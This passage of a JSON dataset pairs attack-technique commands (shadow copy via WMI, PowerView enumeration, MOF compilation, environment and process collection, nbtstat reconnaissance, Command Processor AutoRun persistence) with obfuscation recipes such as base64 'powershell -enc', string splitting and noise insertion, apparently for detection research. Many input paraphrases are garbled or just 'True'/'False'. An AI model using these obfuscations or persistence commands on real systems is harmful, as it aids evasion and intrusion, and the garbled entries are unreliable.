    "obf_category": "Noise Injection",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: This paraphrase is to: Make a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: \"Create a shadow copy using Windows Management Instrumentation (WMI)\"",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Paraphrase: Create a shadow copy using Windows Management Instrumentation (WMI).",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "paraphrase: This paraphrase is to: Make a shadow copy using Windows Management Instrumentation (WMI)",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a shadow copy using Windows Management Instrumentation (WMI)",
    "origin_cmd": "(gwmi -list win32_shadowcopy).Create('${drive_letter}','ClientAccessible')"
  },
  {
    "input": "Import PowerView module and retrieve information about network computers",
    "output": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ": Import :: Import PowerView module and extract power view module from network computers. : Import PowerView module and retrieve information about network computers. Paraphrase: Import PowerView module and retrieve power view module information about network computers.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers : :: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve network information about network computers: – Import",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers. Parphrase: Import PowerView module and retrieve information about network computers.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": "Import PowerView module and retrieve information about network computers",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ": Import :: Import PowerView module and extract power view module from network computers. : Import PowerView module and retrieve information about network computers. Paraphrase: Import PowerView module and retrieve power view module information about network computers.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers : :: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve network information about network computers: – Import",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers. Parphrase: Import PowerView module and retrieve information about network computers.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": "Import PowerView module and retrieve information about network computers",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ": Import :: Import PowerView module and extract power view module from network computers. : Import PowerView module and retrieve information about network computers. Paraphrase: Import PowerView module and retrieve power view module information about network computers.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers : :: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve network information about network computers: – Import",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers. Parphrase: Import PowerView module and retrieve information about network computers.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": "Import PowerView module and retrieve information about network computers",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ": Import :: Import PowerView module and extract power view module from network computers. : Import PowerView module and retrieve information about network computers. Paraphrase: Import PowerView module and retrieve power view module information about network computers.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers : :: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve information about network computers: Import PowerView module and retrieve network information about network computers: – Import",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": ":: Import PowerView module and retrieve information about network computers. Parphrase: Import PowerView module and retrieve information about network computers.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import PowerView module and retrieve information about network computers",
    "origin_cmd": "Import-Module .\\PowerView.ps1 -Force; ; Get-NetComputer"
  },
  {
    "input": "Compile a MOF file using MOF compiler",
    "output": "${mofcomp_path} ${mof_file}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "– paraphrase: Compile a MOF file using MOF compiler using MOF compiler ; Compile a MOF file with compiler used in MOF file ; Compile a MOF file using MOF compiler ; Compile a MOF file ; Compile a MOF file . Compile a MOF file using MOF compiler using compiler ; Compile MOF file . Paraphrase: Compile MOF file using MOF compiler using MOF compiler ; Compile MOF",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: compiler a MOF file by using the MOF compiler. compile an MOF file using a compiler.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: Compile MOF files using compiler .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Compile a MOF file using MOF compiler",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "– paraphrase: Compile a MOF file using MOF compiler using MOF compiler ; Compile a MOF file with compiler used in MOF file ; Compile a MOF file using MOF compiler ; Compile a MOF file ; Compile a MOF file . Compile a MOF file using MOF compiler using compiler ; Compile MOF file . Paraphrase: Compile MOF file using MOF compiler using MOF compiler ; Compile MOF",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: compiler a MOF file by using the MOF compiler. compile an MOF file using a compiler.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: Compile MOF files using compiler .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Compile a MOF file using MOF compiler",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "– paraphrase: Compile a MOF file using MOF compiler using MOF compiler ; Compile a MOF file with compiler used in MOF file ; Compile a MOF file using MOF compiler ; Compile a MOF file ; Compile a MOF file . Compile a MOF file using MOF compiler using compiler ; Compile MOF file . Paraphrase: Compile MOF file using MOF compiler using MOF compiler ; Compile MOF",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: compiler a MOF file by using the MOF compiler. compile an MOF file using a compiler.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: Compile MOF files using compiler .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Compile a MOF file using MOF compiler",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "– paraphrase: Compile a MOF file using MOF compiler using MOF compiler ; Compile a MOF file with compiler used in MOF file ; Compile a MOF file using MOF compiler ; Compile a MOF file ; Compile a MOF file . Compile a MOF file using MOF compiler using compiler ; Compile MOF file . Paraphrase: Compile MOF file using MOF compiler using MOF compiler ; Compile MOF",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: compiler a MOF file by using the MOF compiler. compile an MOF file using a compiler.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Paraphrase: Compile MOF files using compiler .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Compile a MOF file using MOF compiler",
    "origin_cmd": "${mofcomp_path} ${mof_file}"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Retrieve information about services, environment variables, and processes",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Retrieve information about services, environment variables, and processes",
    "origin_cmd": "Get-Service > $env:TEMP\\T1119_1.txt ; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt ; Get-Process > $env:TEMP\\T1119_3.txt"
  },
  {
    "input": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "output": "nbtstat -A ${rem.host.IP}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": Here’s the first: Attempt NetBIOS to get information about a remote host. This isn’t a complete article: Try it.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": A: Note: Use NetBIOS over TCP/IP (NBT) stat. My: Perform NetBIOS over TCP/IP (NBT) stat. I like: Use NetBIOS over TCP/IP (NBT) stat: Test NetBIOS over TCP/IP (NBT).",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": (paraphrase) To paraphrase: (paraphrase) * * * * * * * * * * * * * * * * ** * * ** * ** * * * * * * ***** ** * * * * ****** * * * * * * * * * * * * * ***** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": Here’s the first: Attempt NetBIOS to get information about a remote host. This isn’t a complete article: Try it.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": A: Note: Use NetBIOS over TCP/IP (NBT) stat. My: Perform NetBIOS over TCP/IP (NBT) stat. I like: Use NetBIOS over TCP/IP (NBT) stat: Test NetBIOS over TCP/IP (NBT).",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": (paraphrase) To paraphrase: (paraphrase) * * * * * * * * * * * * * * * * ** * * ** * ** * * * * * * ***** ** * * * * ****** * * * * * * * * * * * * * ***** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": Here’s the first: Attempt NetBIOS to get information about a remote host. This isn’t a complete article: Try it.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": A: Note: Use NetBIOS over TCP/IP (NBT) stat. My: Perform NetBIOS over TCP/IP (NBT) stat. I like: Use NetBIOS over TCP/IP (NBT) stat: Test NetBIOS over TCP/IP (NBT).",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": (paraphrase) To paraphrase: (paraphrase) * * * * * * * * * * * * * * * * ** * * ** * ** * * * * * * ***** ** * * * * ****** * * * * * * * * * * * * * ***** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": Here’s the first: Attempt NetBIOS to get information about a remote host. This isn’t a complete article: Try it.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": A: Note: Use NetBIOS over TCP/IP (NBT) stat. My: Perform NetBIOS over TCP/IP (NBT) stat. I like: Use NetBIOS over TCP/IP (NBT) stat: Test NetBIOS over TCP/IP (NBT).",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": ": (paraphrase) To paraphrase: (paraphrase) * * * * * * * * * * * * * * * * ** * * ** * ** * * * * * * ***** ** * * * * ****** * * * * * * * * * * * * * ***** * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform NetBIOS over TCP/IP (NBT) stat to get information about a remote host",
    "origin_cmd": "nbtstat -A ${rem.host.IP}"
  },
  {
    "input": "Create a new registry item for Command Processor AutoRun",
    "output": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
    "origin_cmd": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Command Processor\" -Name \"AutoRun\" -Value \"${command}\" -PropertyType \"String\""
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new registry item for Command Processor AutoRun",
